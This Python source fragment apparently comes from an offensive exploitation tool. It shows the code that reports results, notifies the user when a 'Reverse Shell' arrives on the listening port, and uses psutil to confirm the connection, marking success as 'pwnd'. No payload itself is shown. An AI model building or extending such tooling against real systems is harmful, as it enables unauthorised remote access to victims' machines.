            sys.stdout.write("{0}  {3}!{2}{4}{1}\n".format(
                color.RB, color.END, color.END + color.RD,
                FAIL, lines.VL,
            ))
            if gui:
                gui.crawlerResultDisplay.append(" FAIL\nTimeout\n")
                gui.show()
        return
    if check_conn():
        sys.stdout.write("{0}   {3}{2}{4}{1}\n".format(
            color.RB,
            color.END,
            color.END + color.RD,
            SUCCESS,
            lines.VL,
        ))
        notify(
            "Reverse Shell arrived on Port {}.".format(
                vars.LISTENPORT
            )
        )
        if gui:
            gui.crawlerResultDisplay.append(" PWN\n")
            gui.show()
        raise ShellPopException("pwnd")
    else:
        sys.stdout.write("{0}   {3}{2}{4}{1}\n".format(
            color.RB, color.END, color.END + color.RD,
            FAIL, lines.VL,
        ))
        if gui:
            gui.crawlerResultDisplay.append(" FAIL\n")
            gui.show()


def check_conn():
    """
    check if our reverse shell has arrived
    """
    # give the server some time
    time.sleep(2)
    try:
        # list all connections
        connections = psutil.net_connections()
        for connection in connections:
            if connection.laddr[1] == int(vars.LISTENPORT):
                # selected listener connection
                if connection.status == psutil.CONN_ESTABLISHED:
                    # shell has arrived, all good
                    return True
    except Exception:
        pass
    return False
